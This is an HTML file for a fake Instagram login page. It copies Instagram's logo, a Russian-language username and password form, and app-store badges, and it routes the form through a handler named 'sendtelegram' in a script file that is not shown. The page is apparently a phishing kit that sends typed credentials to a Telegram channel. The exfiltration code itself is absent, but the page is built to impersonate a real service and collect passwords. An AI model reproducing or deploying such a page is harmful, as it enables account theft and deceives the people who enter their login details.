<head>

<body>
  <div class="container">
      <div class="center">
        <div class="header">
          <img width="300px"  src="Instagram_logo.svg.png" alt="instagramLogo" class="instaLogo" />
        </div>
        <div class="inputElement">
         
         <div class="form">
                 <form action="" onsubmit=" return sendtelegram()">
                    <input type="text" class="inputText" name="name" id="name" placeholder="Имя пользователя, эл. адрес или мобильный т..."  required autocomplete="off">
                    <input type="password" class="inputText" name="email" id="email" placeholder="Пароль" required autocomplete="off">
                  <br> <br>
               <a href="https://www.instagram.com"><button class="inputButton" id="btn" type="submit">Log in</button></a>
        </form>
    </div>
          <div class="forgetPassword"><a class="a" href="https://www.instagram.com/accounts/password/reset/">Forget Password?</a></div>
        </div>
      </div>
      <div class="footer">
      <span>Don't have an account? <a href="https://www.instagram.com">Sign Up</a></span>
      </div>
      <div class="getApps">
           <p>Get the app.</p>
        </div>
      <div class="getApp">
         <div class="logoAppStore">
           <img width="150px" height=105px" src="https://img1.wsimg.com/isteam/ip/74404dce-6d83-4717-96b5-1bc186e49e51/app-store-badge-squarish-0002.png/:/cr=t:0%25,l:0%25,w:100%25,h:100%25/rs=w:600,h:300,cg:true" alt="">
         </div>
         <div class="logoPlay">
           <img width="150px" height="45px" src="https://wfc.tv/assets/img/playstore.png" alt="">
         </div>
      </div>
    </div>
    <script src="app.js"></script>
</body>
